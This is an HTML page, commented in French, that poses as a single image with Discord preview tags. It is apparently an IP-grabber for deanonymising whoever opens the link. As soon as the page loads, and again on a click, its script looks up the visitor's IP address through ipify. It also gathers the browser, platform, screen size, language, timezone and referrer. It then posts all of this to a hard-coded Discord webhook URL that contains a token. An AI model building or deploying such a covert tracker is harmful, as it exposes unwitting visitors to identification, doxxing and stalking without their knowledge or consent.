<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image</title>
    
    <!-- Meta tags pour l'affichage sur Discord -->
    <meta property="og:title" content="">
    <meta property="og:image" content="https://picsum.photos/seed/tracker/1200/800.jpg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="800">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
        }
        img {
            width: 100%;
            height: 100vh;
            object-fit: contain;
            display: block;
        }
    </style>
</head>
<body>
    <img src="https://picsum.photos/seed/tracker/1200/800.jpg" alt="Image" onclick="trackClick()">
    
    <script>
        // Envoie les infos immédiatement au chargement de la page
        document.addEventListener('DOMContentLoaded', function() {
            trackClick();
        });
        
        function trackClick() {
            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const platform = navigator.platform;
            const screenResolution = `${screen.width}x${screen.height}`;
            const referer = document.referrer || "Accès direct";
            const timestamp = new Date().toISOString();
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // Récupère l'adresse IP
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    sendToDiscord(ip, userAgent, language, platform, screenResolution, referer, timestamp, timezone);
                })
                .catch(error => {
                    console.error('Erreur lors de la récupération de l\'IP:', error);
                    sendToDiscord("inconnue", userAgent, language, platform, screenResolution, referer, timestamp, timezone);
                });
        }
        
        function sendToDiscord(ip, userAgent, language, platform, screenResolution, referer, timestamp, timezone) {
            const webhookUrl = "https://discord.com/api/webhooks/1506765844166873200/hw2mE5yGAGATPIlxXgAwMkmlDV7hT9BKuFScjkBH4sbCNRGsAvIsN51mW8iYonjQQKbc";
            
            const embed = {
                title: "🖱️ Nouveau clic sur l'image",
                color: 5814783,
                thumbnail: {
                    url: "https://picsum.photos/seed/tracker/1200/800.jpg"
                },
                fields: [
                    { name: "📍 Adresse IP", value: ip, inline: true },
                    { name: "💻 Plateforme", value: platform, inline: true },
                    { name: "🖥️ Résolution d'écran", value: screenResolution, inline: true },
                    { name: "🌐 Langue", value: language, inline: true },
                    { name: "🕐 Fuseau horaire", value: timezone, inline: true },
                    { name: "🔗 Page d'origine", value: referer, inline: false },
                    { name: "🔍 User Agent", value: userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : ""), inline: false }
                ],
                footer: {
                    text: `Date: ${timestamp}`
                }
            };
            
            const payload = {
                username: "Tracker d'image",
                avatar_url: "https://picsum.photos/seed/tracker/1200/800.jpg",
                content: "Quelqu'un a cliqué sur votre image de tracking !",
                embeds: [embed]
            };
            
            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Erreur lors de l\'envoi du webhook Discord:', response.statusText);
                } else {
                    console.log('Informations envoyées avec succès à Discord');
                }
            })
            .catch(error => {
                console.error('Erreur réseau:', error);
            });
        }
    </script>
</body>
</html>
